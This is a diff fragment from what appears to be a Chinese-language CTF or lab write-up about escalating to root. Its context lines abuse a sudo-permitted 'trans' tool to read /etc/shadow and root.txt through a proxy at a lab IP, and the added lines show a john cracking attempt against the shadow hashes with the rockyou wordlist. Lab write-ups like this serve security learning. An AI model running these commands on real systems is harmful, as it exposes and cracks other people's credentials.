@@ -135,7 +135,11 @@ sudo /usr/local/bin/trans -i /etc/shadow -x http://192.168.31.11:7890 -no-auto
 
 sudo /usr/local/bin/trans -i /root/root.txt -x http://192.168.31.11:7890 -no-auto
 ```
+读取后使用john 进行爆破，但是没有爆破出来。
 
+```css
+john shadow --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
+```
 也可以通过如下命令直接提权到root
 
 ```css
